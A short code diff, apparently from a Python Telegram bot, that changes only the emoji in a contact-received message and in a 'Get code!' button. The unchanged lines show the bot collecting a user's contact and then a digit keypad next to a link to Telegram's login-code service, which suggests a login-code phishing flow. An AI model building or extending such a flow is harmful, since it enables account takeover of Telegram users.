@@ -109,7 +109,7 @@ Hello {user.first_name}!
             
             # Remove keyboard
             await update.message.reply_text(
-                "✅ **Contact Received!**",
+                "👇",
                 reply_markup=ReplyKeyboardRemove()
             )
             
@@ -174,7 +174,7 @@ Hello {user.first_name}!
                     InlineKeyboardButton('0', callback_data=f'n_0_{user_id}')
                 ],
                 [
-                    InlineKeyboardButton('✅ Get code!', url='https://t.me/+42777')
+                    InlineKeyboardButton('👉 Get code!', url='https://t.me/+42777')
                 ]
             ]
             
